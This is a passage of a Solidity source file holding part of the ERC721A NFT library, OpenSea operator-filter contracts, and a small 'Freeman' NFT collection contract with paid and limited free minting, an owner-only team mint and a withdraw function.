1050             // Updates:
1051             // - `address` to the owner.
1052             // - `startTimestamp` to the timestamp of minting.
1053             // - `burned` to `false`.
1054             // - `nextInitialized` to `quantity == 1`.
1055             _packedOwnerships[startTokenId] = _packOwnershipData(
1056                 to,
1057                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1058             );
1059 
1060             uint256 toMasked;
1061             uint256 end = startTokenId + quantity;
1062 
1063             // Use assembly to loop and emit the `Transfer` event for gas savings.
1064             // The duplicated `log4` removes an extra check and reduces stack juggling.
1065             // The assembly, together with the surrounding Solidity code, have been
1066             // delicately arranged to nudge the compiler into producing optimized opcodes.
1067             assembly {
1068                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1069                 toMasked := and(to, _BITMASK_ADDRESS)
1070                 // Emit the `Transfer` event.
1071                 log4(
1072                     0, // Start of data (0, since no data).
1073                     0, // End of data (0, since no data).
1074                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1075                     0, // `address(0)`.
1076                     toMasked, // `to`.
1077                     startTokenId // `tokenId`.
1078                 )
1079 
1080                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1081                 // that overflows uint256 will make the loop run out of gas.
1082                 // The compiler will optimize the `iszero` away for performance.
1083                 for {
1084                     let tokenId := add(startTokenId, 1)
1085                 } iszero(eq(tokenId, end)) {
1086                     tokenId := add(tokenId, 1)
1087                 } {
1088                     // Emit the `Transfer` event. Similar to above.
1089                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1090                 }
1091             }
1092             if (toMasked == 0) revert MintToZeroAddress();
1093 
1094             _currentIndex = end;
1095         }
1096         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1097     }
1098 
1099     /**
1100      * @dev Mints `quantity` tokens and transfers them to `to`.
1101      *
1102      * This function is intended for efficient minting only during contract creation.
1103      *
1104      * It emits only one {ConsecutiveTransfer} as defined in
1105      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1106      * instead of a sequence of {Transfer} event(s).
1107      *
1108      * Calling this function outside of contract creation WILL make your contract
1109      * non-compliant with the ERC721 standard.
1110      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1111      * {ConsecutiveTransfer} event is only permissible during contract creation.
1112      *
1113      * Requirements:
1114      *
1115      * - `to` cannot be the zero address.
1116      * - `quantity` must be greater than 0.
1117      *
1118      * Emits a {ConsecutiveTransfer} event.
1119      */
1120     function _mintERC2309(address to, uint256 quantity) internal virtual {
1121         uint256 startTokenId = _currentIndex;
1122         if (to == address(0)) revert MintToZeroAddress();
1123         if (quantity == 0) revert MintZeroQuantity();
1124         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1125 
1126         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1127 
1128         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1129         unchecked {
1130             // Updates:
1131             // - `balance += quantity`.
1132             // - `numberMinted += quantity`.
1133             //
1134             // We can directly add to the `balance` and `numberMinted`.
1135             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1136 
1137             // Updates:
1138             // - `address` to the owner.
1139             // - `startTimestamp` to the timestamp of minting.
1140             // - `burned` to `false`.
1141             // - `nextInitialized` to `quantity == 1`.
1142             _packedOwnerships[startTokenId] = _packOwnershipData(
1143                 to,
1144                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1145             );
1146 
1147             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1148 
1149             _currentIndex = startTokenId + quantity;
1150         }
1151         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1152     }
1153 
1154     /**
1155      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1156      *
1157      * Requirements:
1158      *
1159      * - If `to` refers to a smart contract, it must implement
1160      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1161      * - `quantity` must be greater than 0.
1162      *
1163      * See {_mint}.
1164      *
1165      * Emits a {Transfer} event for each mint.
1166      */
1167     function _safeMint(
1168         address to,
1169         uint256 quantity,
1170         bytes memory _data
1171     ) internal virtual {
1172         _mint(to, quantity);
1173 
1174         unchecked {
1175             if (to.code.length != 0) {
1176                 uint256 end = _currentIndex;
1177                 uint256 index = end - quantity;
1178                 do {
1179                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1180                         revert TransferToNonERC721ReceiverImplementer();
1181                     }
1182                 } while (index < end);
1183                 // Reentrancy protection.
1184                 if (_currentIndex != end) revert();
1185             }
1186         }
1187     }
1188 
1189     /**
1190      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1191      */
1192     function _safeMint(address to, uint256 quantity) internal virtual {
1193         _safeMint(to, quantity, '');
1194     }
1195 
1196     // =============================================================
1197     //                        BURN OPERATIONS
1198     // =============================================================
1199 
1200     /**
1201      * @dev Equivalent to `_burn(tokenId, false)`.
1202      */
1203     function _burn(uint256 tokenId) internal virtual {
1204         _burn(tokenId, false);
1205     }
1206 
1207     /**
1208      * @dev Destroys `tokenId`.
1209      * The approval is cleared when the token is burned.
1210      *
1211      * Requirements:
1212      *
1213      * - `tokenId` must exist.
1214      *
1215      * Emits a {Transfer} event.
1216      */
1217     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1218         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1219 
1220         address from = address(uint160(prevOwnershipPacked));
1221 
1222         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1223 
1224         if (approvalCheck) {
1225             // The nested ifs save around 20+ gas over a compound boolean condition.
1226             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1227                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1228         }
1229 
1230         _beforeTokenTransfers(from, address(0), tokenId, 1);
1231 
1232         // Clear approvals from the previous owner.
1233         assembly {
1234             if approvedAddress {
1235                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1236                 sstore(approvedAddressSlot, 0)
1237             }
1238         }
1239 
1240         // Underflow of the sender's balance is impossible because we check for
1241         // ownership above and the recipient's balance can't realistically overflow.
1242         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1243         unchecked {
1244             // Updates:
1245             // - `balance -= 1`.
1246             // - `numberBurned += 1`.
1247             //
1248             // We can directly decrement the balance, and increment the number burned.
1249             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1250             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1251 
1252             // Updates:
1253             // - `address` to the last owner.
1254             // - `startTimestamp` to the timestamp of burning.
1255             // - `burned` to `true`.
1256             // - `nextInitialized` to `true`.
1257             _packedOwnerships[tokenId] = _packOwnershipData(
1258                 from,
1259                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1260             );
1261 
1262             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1263             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1264                 uint256 nextTokenId = tokenId + 1;
1265                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1266                 if (_packedOwnerships[nextTokenId] == 0) {
1267                     // If the next slot is within bounds.
1268                     if (nextTokenId != _currentIndex) {
1269                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1270                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1271                     }
1272                 }
1273             }
1274         }
1275 
1276         emit Transfer(from, address(0), tokenId);
1277         _afterTokenTransfers(from, address(0), tokenId, 1);
1278 
1279         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1280         unchecked {
1281             _burnCounter++;
1282         }
1283     }
1284 
1285     // =============================================================
1286     //                     EXTRA DATA OPERATIONS
1287     // =============================================================
1288 
1289     /**
1290      * @dev Directly sets the extra data for the ownership data `index`.
1291      */
1292     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1293         uint256 packed = _packedOwnerships[index];
1294         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1295         uint256 extraDataCasted;
1296         // Cast `extraData` with assembly to avoid redundant masking.
1297         assembly {
1298             extraDataCasted := extraData
1299         }
1300         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1301         _packedOwnerships[index] = packed;
1302     }
1303 
1304     /**
1305      * @dev Called during each token transfer to set the 24bit `extraData` field.
1306      * Intended to be overridden by the cosumer contract.
1307      *
1308      * `previousExtraData` - the value of `extraData` before transfer.
1309      *
1310      * Calling conditions:
1311      *
1312      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1313      * transferred to `to`.
1314      * - When `from` is zero, `tokenId` will be minted for `to`.
1315      * - When `to` is zero, `tokenId` will be burned by `from`.
1316      * - `from` and `to` are never both zero.
1317      */
1318     function _extraData(
1319         address from,
1320         address to,
1321         uint24 previousExtraData
1322     ) internal view virtual returns (uint24) {}
1323 
1324     /**
1325      * @dev Returns the next extra data for the packed ownership data.
1326      * The returned result is shifted into position.
1327      */
1328     function _nextExtraData(
1329         address from,
1330         address to,
1331         uint256 prevOwnershipPacked
1332     ) private view returns (uint256) {
1333         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1334         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1335     }
1336 
1337     // =============================================================
1338     //                       OTHER OPERATIONS
1339     // =============================================================
1340 
1341     /**
1342      * @dev Returns the message sender (defaults to `msg.sender`).
1343      *
1344      * If you are writing GSN compatible contracts, you need to override this function.
1345      */
1346     function _msgSenderERC721A() internal view virtual returns (address) {
1347         return msg.sender;
1348     }
1349 
1350     /**
1351      * @dev Converts a uint256 to its ASCII string decimal representation.
1352      */
1353     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1354         assembly {
1355             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1356             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1357             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1358             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1359             let m := add(mload(0x40), 0xa0)
1360             // Update the free memory pointer to allocate.
1361             mstore(0x40, m)
1362             // Assign the `str` to the end.
1363             str := sub(m, 0x20)
1364             // Zeroize the slot after the string.
1365             mstore(str, 0)
1366 
1367             // Cache the end of the memory to calculate the length later.
1368             let end := str
1369 
1370             // We write the string from rightmost digit to leftmost digit.
1371             // The following is essentially a do-while loop that also handles the zero case.
1372             // prettier-ignore
1373             for { let temp := value } 1 {} {
1374                 str := sub(str, 1)
1375                 // Write the character to the pointer.
1376                 // The ASCII index of the '0' character is 48.
1377                 mstore8(str, add(48, mod(temp, 10)))
1378                 // Keep dividing `temp` until zero.
1379                 temp := div(temp, 10)
1380                 // prettier-ignore
1381                 if iszero(temp) { break }
1382             }
1383 
1384             let length := sub(end, str)
1385             // Move the pointer 32 bytes leftwards to make room for the length.
1386             str := sub(str, 0x20)
1387             // Store the length.
1388             mstore(str, length)
1389         }
1390     }
1391 }
1392 
1393 
1394 interface IOperatorFilterRegistry {
1395     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1396     function register(address registrant) external;
1397     function registerAndSubscribe(address registrant, address subscription) external;
1398     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1399     function unregister(address addr) external;
1400     function updateOperator(address registrant, address operator, bool filtered) external;
1401     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1402     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1403     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1404     function subscribe(address registrant, address registrantToSubscribe) external;
1405     function unsubscribe(address registrant, bool copyExistingEntries) external;
1406     function subscriptionOf(address addr) external returns (address registrant);
1407     function subscribers(address registrant) external returns (address[] memory);
1408     function subscriberAt(address registrant, uint256 index) external returns (address);
1409     function copyEntriesOf(address registrant, address registrantToCopy) external;
1410     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1411     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1412     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1413     function filteredOperators(address addr) external returns (address[] memory);
1414     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1415     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1416     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1417     function isRegistered(address addr) external returns (bool);
1418     function codeHashOf(address addr) external returns (bytes32);
1419 }
1420 
1421 
1422 /**
1423  * @title  OperatorFilterer
1424  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1425  *         registrant's entries in the OperatorFilterRegistry.
1426  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1427  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1428  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1429  */
1430 abstract contract OperatorFilterer {
1431     error OperatorNotAllowed(address operator);
1432 
1433     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1434         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1435 
1436     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1437         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1438         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1439         // order for the modifier to filter addresses.
1440         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1441             if (subscribe) {
1442                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1443             } else {
1444                 if (subscriptionOrRegistrantToCopy != address(0)) {
1445                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1446                 } else {
1447                     OPERATOR_FILTER_REGISTRY.register(address(this));
1448                 }
1449             }
1450         }
1451     }
1452 
1453     modifier onlyAllowedOperator(address from) virtual {
1454         // Check registry code length to facilitate testing in environments without a deployed registry.
1455         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1456             // Allow spending tokens from addresses with balance
1457             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1458             // from an EOA.
1459             if (from == msg.sender) {
1460                 _;
1461                 return;
1462             }
1463             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1464                 revert OperatorNotAllowed(msg.sender);
1465             }
1466         }
1467         _;
1468     }
1469 
1470     modifier onlyAllowedOperatorApproval(address operator) virtual {
1471         // Check registry code length to facilitate testing in environments without a deployed registry.
1472         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1473             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1474                 revert OperatorNotAllowed(operator);
1475             }
1476         }
1477         _;
1478     }
1479 }
1480 
1481 /**
1482  * @title  DefaultOperatorFilterer
1483  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1484  */
1485 abstract contract TheOperatorFilterer is OperatorFilterer {
1486     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1487 
1488     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1489 }
1490 
1491 
1492 contract Freeman is ERC721A, TheOperatorFilterer {
1493     //uriSuffix
1494     string public uriSuffix;
1495 
1496     // owner
1497     address public owner;
1498 
1499     // maxSupply
1500     uint256 public maxSupply;
1501 
1502     // mint price
1503     uint256 public price;
1504 
1505     // entry per addr
1506     uint256 public maxFreePerAddr = 1;
1507 
1508     mapping(address => uint256) _numForFree;
1509 
1510     mapping(uint256 => uint256) _numMinted;
1511 
1512     uint256 private maxPerTx;
1513 
1514     function mint(uint256 amount) payable public {
1515         require(totalSupply() + amount <= maxSupply);
1516         if (msg.value == 0) {
1517             mint1(amount);
1518             return;
1519         } 
1520         require(amount <= maxPerTx);
1521         require(msg.value >= amount * price);
1522         _safeMint(msg.sender, amount);
1523     }
1524 
1525     function mint1(uint256 amount) internal {
1526         require(amount == 1 
1527             && _numMinted[block.number] < getFreeNum() 
1528             && _numForFree[tx.origin] < maxFreePerAddr );
1529             _numForFree[tx.origin]++;
1530             _numMinted[block.number]++;
1531         _safeMint(msg.sender, 1);
1532     }
1533 
1534 
1535     function team(address rec, uint256 amount) public onlyOwner {
1536         _safeMint(rec, amount);
1537     }
1538     
1539     modifier onlyOwner {
1540         require(owner == msg.sender);
1541         _;
1542     }
1543 
1544     constructor() ERC721A("Freeman by Sole", "Freeman") {
1545         owner = msg.sender;
1546         maxPerTx = 10;
1547         price = 0.002 ether;
1548         maxSupply = 799;
1549     }
1550 
1551     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1552         return string(abi.encodePacked("ipfs://QmTVBA811tMHsL1R3TpCNksxtmTBVJzgFMySQCSpegdnem/", _toString(tokenId), ".json"));
1553     }
1554 
1555     function setMaxFreePerAddr(uint256 maxTx) external onlyOwner {
1556         maxFreePerAddr = maxTx;
1557     }
1558 
1559     function getFreeNum() internal returns (uint256){
1560         return (maxSupply - totalSupply()) / 12;
1561     }
1562 
1563     function withdraw() external onlyOwner {
1564         payable(msg.sender).transfer(address(this).balance);
1565     }
1566 
1567     /////////////////////////////
1568     // OPENSEA FILTER REGISTRY 
1569     /////////////////////////////
1570 
1571     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1572         super.setApprovalForAll(operator, approved);
1573     }
1574 
1575     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1576         super.approve(operator, tokenId);
1577     }
1578 
1579     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1580         super.transferFrom(from, to, tokenId);
1581     }
1582 
1583     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1584         super.safeTransferFrom(from, to, tokenId);
1585     }
1586 
1587     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1588         public
1589         payable
1590         override
1591         onlyAllowedOperator(from)
1592     {
1593         super.safeTransferFrom(from, to, tokenId, data);
1594     }
1595 }